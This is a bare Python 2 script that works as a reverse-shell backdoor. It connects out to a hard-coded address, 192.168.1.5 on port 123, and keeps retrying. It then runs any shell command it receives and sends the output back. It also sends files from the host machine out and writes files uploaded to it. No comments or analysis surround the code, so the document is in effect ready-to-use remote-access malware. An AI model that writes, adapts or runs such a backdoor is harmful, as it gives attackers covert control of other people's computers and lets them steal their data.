from subprocess import *
from socket import *
import os,sys,time
hp = h, p ='192.168.1.5', 123
nu = 99*9999
def file(arg):
	try:
		lo = os.getcwd()
		try :
			os.chdir(arg)
		except:pass	
		os.chdir(lo+'\\'+arg.capitalize())
		l = os.getcwd()
		s.sendall(l)
	except:
		v = os.getcwd()
		s.sendall(v)	
while 1:
	

	
	while 2:
		try:
			s = socket(AF_INET,SOCK_STREAM)
			s.connect((hp))
			print 'connect'
			a = os.getcwd()
			s.sendall(a)
			break
		except:
			time.sleep(2)
			print 'there is no connection'
			s.close()
			continue
	



	while 3:
		try:
			dat = s.recv(9999)
			if not dat :
				print 'connection refused'
				break
###############################################################

			if dat[:2] == 'cd':
				lo = dat[3:].capitalize()
				file(lo)	
				continue

################################################################				
			if dat.startswith("download") == True:
				lis = os.listdir(os.getcwd())
				check = s.recv(1024)
				if check in lis:
					s.sendall('True')
					try:
						with open(dat[9:],'rb') as f:
							print dat[9:]
							d = f.read()
							s.sendall(d+'end')

							f.close()
						continue	
					except:
						s.sendall("file can't open")	
						continue
				else:
					s.sendall('False')
					continue		

#################################################################	


			if dat.startswith('upload') == True:
				try:
				
						
					file = open('download_'+dat[7:],'wb')
					while True:
						dt = s.recv(nu)
						if dt == "file can't open":
							file.close()
							os.remove(dat[7:])
							break
						while (dt):
							if dt.endswith('end') == True:
								file.write(dt[:-3])
								file.close()
								break
							else:
								file.write(dt)
								dt = s.recv(nu)
						break
					continue	


						
				except:
					os.remove(dat[7:])
					print 'erreur'
					continue	
##################################################################					

			try:

				data = check_output(dat,shell=True)		
				if len(data) <= 1:
					result = 'process completed'
					s.sendall(result)
					continue
				else:	
					
					s.sendall(data)	
			except:
				s.sendall('Failled')				
		except:
			print ('connction refused')
			break
	
	continue		
s.close()		
			
print 'done'	


